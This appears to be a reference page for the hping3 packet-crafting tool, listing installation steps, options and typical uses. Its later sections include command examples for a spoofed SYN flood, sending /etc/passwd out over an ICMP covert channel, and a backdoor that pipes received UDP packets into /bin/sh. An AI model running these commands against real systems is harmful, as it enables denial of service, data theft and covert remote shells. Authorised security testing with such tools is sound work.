hping3
===

Network tool for security testing and packet generation.

## Supplemental Information

**hping** is an open-source tool used for generating and analyzing TCP/IP protocol packets, created by Salvatore Sanfilippo. The latest version, `hping3`, supports automation via Tcl scripting. It is a standard tool for security auditing, firewall testing, and network probing. Its primary advantage is the ability to customize every part of a packet, allowing for precise probing of target systems.

### Installation

```shell
yum install libpcap-devel tc-devel
ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
wget http://www.hping.org/hping3-20051105.tar.gz
tar zxvf hping3-20051105.tar.gz
cd hping3-20051105
./configure
make
make install
```

### Options

```shell
-H, --help        # Show help.
-v, -VERSION      # Show version info.
-c, --count count # Number of packets to send.
-i, --interval X  # Wait X milliseconds between packets (default is 1 second).
--fast            # Send 10 packets per second.
-n, --numeric     # Numeric output only.
-q, --quiet       # Quiet mode.
-I, --interface   # Specify network interface (e.g., eth0).
-V, --verbose     # Verbose output.
-D, --debug       # Enable debug mode.
-1, --icmp        # ICMP mode.
-2, --udp         # UDP mode.
-8, --scan        # Scan mode.
-9, --listen      # Listen mode.
-a, --spoof       # Spoof source IP address.
-t, --ttl         # Set Time To Live.
-F, --fin         # Set FIN flag.
-S, --syn         # Set SYN flag.
-R, --rst         # Set RST flag.
-P, --push        # Set PUSH flag.
-A, --ack         # Set ACK flag.
-U, --urg         # Set URG flag.
-X, --xmas        # Set Xmas scan flags.
-Y, --ymas        # Set Ymas scan flags.
```

### Hping3 Typical Applications

### # Firewall Testing

Use `hping3` to test firewalls by specifying various packet fields. For example, to test a firewall's reaction to a Land Attack (setting the source address to be the same as the target):

```shell
hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
```

### # Port Scanning

`hping3` can scan target ports and supports specifying TCP flags and lengths. To check if port 80 is open:

```shell
hping3 -I eth0 -S 192.168.10.1 -p 80
```

While `hping3` supports most scanning methods used by Nmap (except the `connect` method), it is typically used for fine-grained control on a small number of ports rather than large-scale scanning.

### # Idle Scan

Idle scanning is an anonymous scanning technique invented by the author of `hping3`. It uses an "idle" host to bounce packets off a target, allowing the attacker to determine port status without sending packets directly from their own IP.

### # Denial of Service (DoS) Attacks

`hping3` can easily be used to simulate DoS attacks, such as SYN flooding:

```shell
hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```

### # File Transfer

`hping3` can transfer files over TCP/UDP/ICMP by embedding data in packets. This creates a covert channel.

On the receiver:
```shell
hping3 192.168.1.159 --listen signature --safe --icmp
```

On the sender:
```shell
hping3 192.168.1.108 --icmp -d 100 --sign signature --file /etc/passwd
```

### # Trojan Functionality

`hping3` can act similarly to `netcat` by listening for specific packets and executing commands received.

Receiver (backdoor):
```shell
hping3 192.168.10.66 --listen signature --safe --udp -p 53 | /bin/sh
```

Sender (controller):
```shell
echo ls > test.cmd
hping3 192.168.10.44 -p 53 -d 100 --udp --sign signature --file ./test.cmd
```
